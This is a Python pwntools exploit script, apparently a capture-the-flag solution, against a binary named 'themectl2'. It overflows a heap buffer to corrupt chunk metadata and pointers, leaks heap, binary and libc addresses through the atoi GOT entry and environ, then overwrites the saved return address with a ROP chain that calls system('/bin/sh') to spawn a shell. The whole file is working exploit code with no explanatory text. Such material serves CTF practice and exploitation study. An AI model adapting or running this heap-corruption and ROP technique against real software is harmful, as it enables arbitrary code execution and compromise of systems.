from pwn import *

context.arch = "amd64"
context.terminal = ["konsole", "-e"]

#p = gdb.debug("./themectl2", gdbscript="""set follow-fork-mode parent""")
p = process("./themectl2")

e = ELF("./themectl2")
libc = ELF("libc.so.6")


def create_user(name, pw, size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b": ", name)
    p.sendlineafter(b": ", pw)
    p.sendlineafter(b"? ", str(size).encode('utf-8'))


def login(name, pw):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b": ", name)
    p.sendlineafter(b": ", pw)

def leave():
    p.sendlineafter(b"> ", b"3")

def edit(index, string):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"? ", str(index).encode('utf-8'))
    p.sendlineafter(b": ", string)


def view(index):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"? ", str(index).encode('utf-8'))
    return p.recvline()

def submit():
    p.sendlineafter(b"> ", b"3")
    p.interactive()

def logout():
    p.sendlineafter(b"> ", b"4")


gdb.attach(p)

create_user(b"USER1", b"USER1PW", 1)
edit(0, b"A" * 8)
logout()

create_user(b"USER2", b"USER2PW", 1)
edit(0, b"C" * 8)
logout()

login(b"USER1", b"USER1PW")
payload = b"A" * 40
payload += p64(0x0000000000000021)
payload += p32(0x69696969) # newline overwrites data after
edit(0, payload)

logout()

create_user(b"USER3", b"USER3PW", 1)
edit(0, b"D" * 8)
logout()

login(b"USER2", b"USER2PW")
edit(27, p64(0x1010101010101010))

logout()

login(b"USER3", "USER3PW")
heap_base = unpack(view(0)[:-1], "all") - 0x4d0

print("heap @", hex(heap_base))

logout()


login(b"USER2", b"USER2PW")
edit(27, p64(0x1010101010101010) + p64(heap_base + 0x2a0))
logout()

login(b"USER3", "USER3PW")
binary_base = unpack(view(0)[:-1], "all") - 0x2008

assert binary_base > 0, "failed getting binary base"

print("binary @", hex(binary_base))

logout()

login(b"USER2", b"USER2PW")
print("leaking", hex(binary_base + e.got["atoi"]))
edit(27, p64(0x1010101010101010) + p64(binary_base + e.got["atoi"]))
logout()

login(b"USER3", "USER3PW")

leak = unpack(view(0)[:-1], "all")

print(f"leak: 0x{leak:x}")

libc.address = leak - libc.sym["atoi"]
#edit(0, p64(libc.sym["system"]))
#p.sendline(b"/bin/sh")
logout()

login(b"USER2", b"USER2PW")

edit(5, p64(0x1010101010101010) + p64(libc.sym["environ"]))
stack_ad = unpack(view(0)[:-1], "all")

rip = stack_ad - 0x120

print(f"rip: 0x{rip:x}")

edit(5, p64(0x1010101010101010) + p64(rip))

POP_RDI = libc.address + 0x000000000002a3e5
RET = POP_RDI + 1

payload = p64(RET)
payload += p64(POP_RDI)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.symbols["system"])
edit(0, payload)

logout()
leave()

p.interactive()
